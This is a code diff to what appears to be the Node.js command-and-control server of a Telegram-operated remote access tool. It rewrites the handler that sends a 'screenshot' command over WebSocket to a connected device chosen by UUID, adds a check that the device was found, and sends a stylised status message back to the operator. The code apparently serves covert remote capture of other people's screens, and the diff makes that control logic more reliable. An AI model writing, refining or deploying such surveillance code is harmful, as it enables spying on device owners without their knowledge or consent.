@@ -759,18 +759,35 @@ appBot.on("callback_query", (callbackQuery) => {
             '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
-    if (commend == 'screenshot') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('screenshot');
-            }
-        });
+    if (command === 'screenshot') {
+    let clientFound = false;
+
+    // Iterate over WebSocket clients
+    appSocket.clients.forEach(ws => {
+        if (ws.uuid === uuid) {
+            // Send screenshot command to the WebSocket client
+            ws.send('screenshot');
+            clientFound = true;
+        }
+    });
+
+    // Check if WebSocket client with the given UUID was found
+    if (clientFound) {
+        // Delete the message
         appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
-        )
+            .then(() => {
+                // Send response message
+                appBot.sendMessage(id, '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ');
+            })
+            .catch(error => {
+                console.error('Error deleting message:', error);
+            });
+    } else {
+        // Send error message if WebSocket client with the given UUID was not found
+        appBot.sendMessage(id, 'Unable to find WebSocket client with the provided UUID.');
     }
+}
 
     // Assuming you're using a Telegram bot framework/library
 
